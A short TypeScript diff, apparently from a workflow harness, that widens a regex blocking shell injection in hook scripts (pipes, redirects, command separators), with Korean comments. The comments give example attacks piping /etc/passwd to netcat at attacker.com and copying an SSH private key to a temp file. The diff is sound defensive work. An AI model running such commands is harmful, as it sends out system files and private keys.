@@ -225,11 +225,13 @@ function getWorkspacePath(config: WorkflowConfig, issue: HarnessIssue): string {
   return path.join(config.workspace.root, sanitizeKey(issue.identifier))
 }
 
-// hook 스크립트에서 허용하지 않는 셸 확장 패턴 — $(), ``, 파이프 체이닝, 명령 분리자 등
+// hook 스크립트에서 허용하지 않는 셸 확장 패턴 — $(), ``, 파이프/리다이렉트, 명령 분리자 등
 // 단순 명령어 + 경로 인수는 허용, 셸 인젝션 벡터는 차단
+// |  — 파이프 (cat /etc/passwd | nc attacker.com)
+// >  — 리다이렉트 (cat ~/.ssh/id_rsa > /tmp/leak)
 // ;  — 명령 분리자 (command1; command2)
 // <( — 프로세스 치환
-const HOOK_UNSAFE_RE = /\$\(|`[^`]*`|\|\||&&|>>|;|<\(/
+const HOOK_UNSAFE_RE = /\$\(|`[^`]*`|\|+|>+|&&|;|<\(/
 
 function runHook(script: string, cwd: string, timeoutMs: number): Promise<void> {
   if (HOOK_UNSAFE_RE.test(script)) {
